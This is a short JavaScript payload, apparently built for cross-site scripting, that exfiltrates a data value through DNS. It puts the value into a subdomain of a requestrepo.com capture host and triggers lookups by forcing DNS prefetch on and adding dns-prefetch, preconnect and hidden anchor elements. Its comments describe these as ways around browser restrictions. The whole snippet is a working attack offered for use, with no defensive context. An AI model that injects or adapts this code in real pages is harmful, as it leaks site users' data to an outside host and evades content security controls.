(function() {
    // 1. Force DNS Prefetch Control to "ON"
    const meta = document.createElement('meta');
    meta.httpEquiv = "x-dns-prefetch-control";
    meta.content = "on";
    document.head.appendChild(meta);

    const secret = "data_to_exfiltrate"; // Your dynamic data
    const domain = ".qycrk5z4.requestrepo.com";
    const targetUrl = `https://${secret}${domain}`;

    // 2. Standard DNS Prefetch
    const link = document.createElement('link');
    link.rel = 'dns-prefetch';
    link.href = targetUrl;
    document.head.appendChild(link);

    // 3. Preconnect (More aggressive, often allowed if prefetch is)
    const conn = document.createElement('link');
    conn.rel = 'preconnect';
    conn.href = targetUrl;
    document.head.appendChild(conn);

    // 4. The "Anchor" Trick
    // Browsers sometimes prefetch URLs found in <a> tags more reliably
    const a = document.createElement('a');
    a.href = targetUrl;
    a.style.display = 'none';
    document.body.appendChild(a);
    
    console.log(`[OOB] Attempting DNS lookup for: ${targetUrl}`);
})();
